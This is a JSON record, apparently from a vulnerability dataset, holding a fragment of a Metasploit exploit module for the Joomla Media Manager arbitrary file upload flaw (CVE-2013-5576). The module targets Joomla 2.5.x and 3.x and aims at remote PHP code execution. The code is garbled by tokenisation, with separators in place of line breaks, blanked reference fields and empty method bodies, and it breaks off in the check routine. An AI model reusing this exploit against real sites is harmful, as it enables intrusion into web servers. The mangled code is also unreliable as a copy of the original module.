{
    "text": "vul_name : Joomla Media Manager File Upload Vulnerability ， vul_cve : CVE-2013-5576 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"Joomla Media Manager File Upload Vulnerability\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in Joomla 2.5.x up to 2.5.13 , as well as ， 3.x up to 3.1.4 versions. The vulnerability exists in the Media Manager component ,  ， which comes by default in Joomla , allowing arbitrary file uploads , and results in ， arbitrary code execution. The module has been tested successfully on Joomla 2.5.13 ， and 3.1.4 on Ubuntu 10.04. Note : If public access isn't allowed to the Media ， Manager , you will need to supply a valid username and password ( Editor role or ， higher ) in order to work properly. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Jens Hinrichsen' ,  # Vulnerability discovery according to the OSVDB ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'OSVDB' , '95933' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ，  # Arbitrary big number. The payload gets sent as POST data , so ，  # really it's unlimited ， 'Space' => 262144 ,  # 256k ， } ,  ， 'Platform' => [ 'php' ]  ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => ，  [  ，  [ 'Joomla 2.5.x <= 2.5.13' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Aug 01 2013\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Joomla' , '/joomla' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ false , 'User to login with' , ' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , 'Password to login with' , ' ]  )  ,  ，  ]  , self.class )  ， end ， def peer ， end ， def check ， res = get_upload_form ， print_status ( \" # {peer} - Joomla Media Manager Found but authentication required\" ) ",
    "time": "2013-08-15 / 2013-10-17"
}